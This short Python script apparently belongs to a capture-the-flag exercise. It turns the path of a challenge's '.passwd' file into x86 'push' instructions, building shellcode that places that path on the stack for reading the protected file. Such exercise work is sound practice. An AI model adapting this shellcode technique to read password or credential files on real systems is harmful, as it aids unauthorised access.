import struct

def next_multiple(n, m):
    return n + (m - n % m) % m

chunk_size = 4
target = b'/challenge/app-systeme/ch32/.passwd\x00'

target = target.ljust(next_multiple(len(target), chunk_size), b'\xAA')
target = target[::-1]

print(f'; push {repr(target[::-1])[1:]} backwards on the stack')
for i in range(len(target) // chunk_size):
    j = i * chunk_size
    chunk = target[j:j + chunk_size]
    v = struct.unpack('>I', chunk)[0]
    print(f'push 0x{v:08x} ; {repr(chunk[::-1])[2:-1]}')

print(f'add esp, {len(target)} ; clean up stack')